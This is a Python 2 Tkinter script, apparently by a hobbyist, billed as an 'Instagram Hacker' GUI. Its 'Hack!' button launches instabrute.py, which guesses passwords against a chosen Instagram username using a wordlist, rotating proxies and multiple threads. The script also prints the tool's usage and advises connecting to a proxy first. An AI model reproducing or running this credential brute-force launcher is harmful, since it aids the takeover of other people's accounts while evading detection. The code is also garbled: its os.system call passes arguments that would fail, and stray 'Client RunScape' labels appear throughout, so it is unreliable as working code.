# coding=utf-8
###############################################################################
# Instagram Hacker GUI
# Developed By minedevelopes@instagram
# rivan726@gmail.com
# !/usr/bin/python
###############################################################################
# imports :

from Tkinter import *
import tkMessageBox
import os
import time

# App Defs
def hack():
	tkMessageBox.showinfo('Hack', 'Starting on Client Run Scape!')
	print('Starting tool.../InstaBrute/....')
	time.sleep(2)
	print('Starting tool.../InstaBrute/....Done!')
	print('Hacking Instagram account...')
	user = open('/resources/usernames/tempusername','r').read()
	os.system('python /tools/instabrute.py -u',user,'-w /resources/wordlist/simple100 -p /resources/proxylist/simple39 -t 4 -d -v')

def help():
	print('### Usage')
	print('./instabrute.py [-h] -u USERNAME -w WORD -p PROXY [-t THREAD] [-v] [-d]')
	print(' ./instabrute -u user_test -w words.txt -p proxys.txt -t 4 -d -v')
	tkMessageBox.showinfo('Help', 'The help is shown on the terminal client!')

def clear():
	print('Clearing Client RunScape...')
	os.system('clear')
	print('------------------------------- Client RunScape ------------------------------')

def user():
	print('Starting the editor client...')
	print('Only type one username or else the program with run into an error!')
	os.system('nano /resources/usernames/tempusername')

# Before Code
os.system('clear')
print('(+) Welome to InstaGramHacker!')
print('(+) Made By minedevelopes, at Sun Sep 17:2017, 9:59:15 AM')
time.sleep(1)
print('(_INFO_) This is a GUI plus CLI Tool that makes the other only CLI tools easy to use!')
print('(_INFO_) Before you start connect to a free proxy server : IMPORTANT :')
print('(_INFO_) Starting GUI Client...')
time.sleep(2)
print('(_INFO_) Starting GUI Client...Done!')
print('------------------------------- Client RunScape ------------------------------')

# Window Creating Code
root = Tk()
root.title('InstaGramHacker!')
root.geometry('150x400')
app = Frame(root)
app.grid()

# App Widgets
welcomelabel = Label(app, text = 'Welcome to SideClient!', anchor=CENTER)
welcomelabel.grid()
spacerlabel1 = Label(app, text = '----------------------', anchor=CENTER)
spacerlabel1.grid()
helpbutton = Button(app, text = 'Help!', command = help)
helpbutton.grid()
playbutton = Button(app, text = 'Hack!', command = hack)
playbutton.grid()
clearbutton = Button(app, text = 'Clear!', command = clear)
clearbutton.grid()
editbutton = Button(app, text = 'User!', command = user)
editbutton.grid()
spacerlabel2 = Label(app, text = '----------------------', anchor=CENTER)
spacerlabel2.grid()
creditlabel = Label(app, text = 'Credits To Minedevelopes!', anchor=CENTER)
creditlabel.grid()


# Main loop kick off
root.mainloop()
